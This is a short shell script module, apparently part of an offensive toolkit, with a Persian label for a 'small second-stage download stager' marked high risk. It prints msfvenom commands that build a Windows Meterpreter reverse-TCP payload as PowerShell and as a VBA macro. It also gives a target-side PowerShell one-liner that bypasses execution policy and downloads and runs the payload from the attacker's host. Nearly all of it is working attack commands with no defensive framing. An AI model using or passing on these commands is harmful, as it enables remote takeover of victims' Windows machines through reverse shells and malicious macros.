DESC="پیلود استیجر (کوچک، دانلود مرحله‌ی دوم)"
RISK="HIGH"

termux(){ echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> -f psh-reflection -o p.ps1"; }

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f psh-reflection -o p.ps1
# اجرا روی هدف:
#   powershell -ep bypass -c "iex(iwr -useb http://$LHOST/p.ps1)"
# یا یک‌خطی:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f vba -o p.vba
EOF
}